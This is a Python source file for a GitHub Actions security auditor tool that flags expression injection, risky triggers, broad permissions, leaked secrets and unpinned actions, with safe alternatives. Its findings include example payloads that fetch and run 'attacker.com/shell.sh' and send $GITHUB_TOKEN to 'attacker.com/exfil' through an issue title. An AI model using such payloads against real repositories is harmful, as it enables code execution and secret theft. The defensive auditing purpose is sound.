"""GitHub Actions workflow auditor for security vulnerabilities."""

import re
from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

ToolAction = Literal[
    "audit_workflows",
    "check_permissions",
    "find_injection_points",
    "audit_secrets",
    "check_third_party",
]


@register_tool(sandbox_execution=True)
def github_actions_auditor(
    action: ToolAction,
    workflow_content: str | None = None,
    repository: str | None = None,
    **kwargs: Any,
) -> dict[str, Any] | str:
    """GitHub Actions workflow auditor for security vulnerabilities.

    Args:
        action: The action to perform
        workflow_content: YAML content of workflow file
        repository: Repository name (owner/repo)

    Returns:
        Results dict or error message
    """
    VALID_PARAMS = {
        "action", "workflow_content", "repository",
    }
    VALID_ACTIONS = [
        "audit_workflows",
        "check_permissions",
        "find_injection_points",
        "audit_secrets",
        "check_third_party",
    ]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "github_actions_auditor"):
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "github_actions_auditor"):
        return action_error

    if action == "audit_workflows":
        content = workflow_content or '''
name: CI
on:
  pull_request:
  issue_comment:
    types: [created]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: echo "Building ${{ github.event.issue.title }}"
      - run: npm install
      - run: npm test
'''

        findings = []

        # Check for command injection via github context
        injection_contexts = [
            "github.event.issue.title",
            "github.event.issue.body",
            "github.event.pull_request.title",
            "github.event.pull_request.body",
            "github.event.comment.body",
            "github.event.review.body",
            "github.event.head_commit.message",
            "github.head_ref",
            "github.event.inputs",
        ]

        for ctx in injection_contexts:
            if ctx in content:
                findings.append({
                    "severity": "critical",
                    "type": "command_injection",
                    "issue": f"Potential command injection via {ctx}",
                    "description": "User-controlled input used directly in run command",
                    "exploitation": f'Set {ctx} to: "; curl attacker.com/shell.sh | bash #"',
                })

        # Check for dangerous triggers
        dangerous_triggers = ["issue_comment", "pull_request_target", "workflow_run"]
        for trigger in dangerous_triggers:
            if trigger in content:
                findings.append({
                    "severity": "high",
                    "type": "dangerous_trigger",
                    "issue": f"Dangerous trigger: {trigger}",
                    "description": "This trigger can be exploited by external contributors",
                })

        # Check for checkout of PR head
        if "pull_request_target" in content and "actions/checkout" in content:
            if "ref:" in content and ("pull_request" in content or "${{ github" in content):
                findings.append({
                    "severity": "critical",
                    "type": "pwn_request",
                    "issue": "Pwn Request vulnerability detected",
                    "description": "Checking out PR code in pull_request_target context",
                })

        return {
            "action": "audit_workflows",
            "content_length": len(content),
            "findings": findings,
            "total_issues": len(findings),
            "severity_summary": {
                "critical": len([f for f in findings if f["severity"] == "critical"]),
                "high": len([f for f in findings if f["severity"] == "high"]),
            },
            "scan_tools": [
                "actionlint - GitHub Actions linter",
                "zizmor - GitHub Actions security scanner",
            ],
        }

    elif action == "check_permissions":
        content = workflow_content or '''
name: Deploy
on: push

permissions:
  contents: write
  packages: write
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
'''

        findings = []

        # Check for write permissions
        if "contents: write" in content:
            findings.append({
                "severity": "medium",
                "issue": "Contents write permission granted",
                "risk": "Can modify repository files, create releases",
            })

        if "id-token: write" in content:
            findings.append({
                "severity": "medium",
                "issue": "OIDC token write permission",
                "risk": "Can request OIDC tokens for cloud authentication",
            })

        if "packages: write" in content:
            findings.append({
                "severity": "medium",
                "issue": "Packages write permission",
                "risk": "Can publish packages to GitHub Packages",
            })

        if "permissions:" not in content:
            findings.append({
                "severity": "high",
                "issue": "No explicit permissions defined",
                "risk": "Inherits default permissions (may be too broad)",
                "recommendation": "Define minimal required permissions",
            })

        return {
            "action": "check_permissions",
            "findings": findings,
            "least_privilege_template": '''
permissions:
  contents: read  # Only read access to repo
  # Add only what you need:
  # packages: read
  # issues: write
  # pull-requests: write
''',
            "permission_reference": {
                "contents": "Repository content (code, commits)",
                "packages": "GitHub Packages",
                "issues": "Issues and comments",
                "pull-requests": "Pull requests",
                "id-token": "OIDC token requests",
                "actions": "Actions workflows",
                "security-events": "Code scanning alerts",
            },
        }

    elif action == "find_injection_points":
        content = workflow_content or '''
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.issue.title }}"
      - run: |
          TITLE="${{ github.event.pull_request.title }}"
          echo $TITLE
      - uses: actions/github-script@v6
        with:
          script: |
            console.log("${{ github.event.comment.body }}")
'''

        # Expression injection patterns
        injection_patterns = [
            {
                "pattern": r'\$\{\{\s*github\.event\.(issue|pull_request|comment|review)\.(title|body)\s*\}\}',
                "context": "Direct shell injection",
                "severity": "critical",
            },
            {
                "pattern": r'\$\{\{\s*github\.head_ref\s*\}\}',
                "context": "Branch name injection",
                "severity": "high",
            },
            {
                "pattern": r'\$\{\{\s*github\.event\.inputs\.',
                "context": "Workflow input injection",
                "severity": "high",
            },
        ]

        injection_points = []
        for pat in injection_patterns:
            matches = re.findall(pat["pattern"], content)
            if matches:
                injection_points.append({
                    "pattern": pat["pattern"],
                    "context": pat["context"],
                    "severity": pat["severity"],
                    "matches": len(matches) if isinstance(matches[0], str) else len(matches),
                })

        return {
            "action": "find_injection_points",
            "injection_points": injection_points,
            "total_points": len(injection_points),
            "safe_alternatives": {
                "environment_variable": '''
# Safe: Use environment variable (properly quoted)
steps:
  - run: echo "$TITLE"
    env:
      TITLE: ${{ github.event.issue.title }}
''',
                "intermediate_step": '''
# Safe: Validate/sanitize first
steps:
  - name: Validate input
    id: validate
    run: |
      # Sanitize the input
      SAFE_TITLE=$(echo "${{ github.event.issue.title }}" | tr -cd '[:alnum:] ')
      echo "title=$SAFE_TITLE" >> $GITHUB_OUTPUT
  - run: echo "${{ steps.validate.outputs.title }}"
''',
            },
            "exploitation_example": '''
# Attacker creates issue with title:
# "; curl https://attacker.com/exfil?token=$GITHUB_TOKEN #

# This gets executed as:
# echo ""; curl https://attacker.com/exfil?token=$GITHUB_TOKEN #"

# Secrets are exfiltrated!
''',
        }

    elif action == "audit_secrets":
        content = workflow_content or '''
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      API_KEY: ${{ secrets.API_KEY }}
    steps:
      - run: |
          echo "Deploying with $API_KEY"
          curl -H "Authorization: ${{ secrets.GITHUB_TOKEN }}" api.github.com
      - run: echo "${{ secrets.AWS_SECRET_KEY }}" > /tmp/key
'''

        findings = []

        # Check for secret logging
        if re.search(r'echo.*\$\{\{\s*secrets\.', content):
            findings.append({
                "severity": "critical",
                "issue": "Secrets may be logged via echo",
                "description": "Echoing secrets exposes them in logs",
            })

        # Check for secret in file
        if re.search(r'\$\{\{\s*secrets\.[^}]+\}\}.*>', content):
            findings.append({
                "severity": "high",
                "issue": "Secret written to file",
                "description": "Secrets written to files may be exposed",
            })

        # Check for GITHUB_TOKEN usage
        if "secrets.GITHUB_TOKEN" in content:
            findings.append({
                "severity": "info",
                "issue": "GITHUB_TOKEN usage detected",
                "description": "Verify token is used appropriately",
            })

        return {
            "action": "audit_secrets",
            "findings": findings,
            "secret_best_practices": [
                "Never echo secrets or write to files",
                "Use OIDC instead of long-lived credentials",
                "Scope GITHUB_TOKEN permissions appropriately",
                "Use environments with protection rules",
                "Rotate secrets regularly",
            ],
            "safe_secret_usage": '''
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Protected environment
    steps:
      - name: Deploy
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1
          # Uses OIDC, no static credentials
''',
        }

    elif action == "check_third_party":
        content = workflow_content or '''
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: some-org/dangerous-action@main
      - uses: docker://ghcr.io/owner/image:latest
'''

        findings = []

        # Check for unpinned actions
        unpinned = re.findall(r'uses:\s+[^@]+@(main|master|latest|v\d+)(?:\s|$)', content)
        if unpinned:
            findings.append({
                "severity": "high",
                "issue": f"Unpinned actions: {len(unpinned)} found",
                "description": "Actions without commit SHA can be modified",
                "recommendation": "Pin to specific commit SHA",
            })

        # Check for non-official actions
        third_party = re.findall(r'uses:\s+(?!actions/|github/)([^/]+/[^@\s]+)', content)
        if third_party:
            findings.append({
                "severity": "medium",
                "issue": f"Third-party actions: {third_party}",
                "description": "Review third-party actions for security",
            })

        # Check for Docker images
        docker_images = re.findall(r'uses:\s+docker://([^\s]+)', content)
        if docker_images:
            findings.append({
                "severity": "medium",
                "issue": f"Docker images used: {docker_images}",
                "description": "Container images should be verified",
            })

        return {
            "action": "check_third_party",
            "findings": findings,
            "pinning_example": '''
# Bad - can be modified
- uses: actions/checkout@v3

# Good - pinned to SHA
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.1
''',
            "verification_steps": [
                "Check action source code",
                "Verify action is from trusted org",
                "Pin to commit SHA, not tag",
                "Monitor for security advisories",
                "Use dependabot for action updates",
            ],
            "dependabot_config": '''
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
''',
        }

    return generate_usage_hint("github_actions_auditor", VALID_ACTIONS)
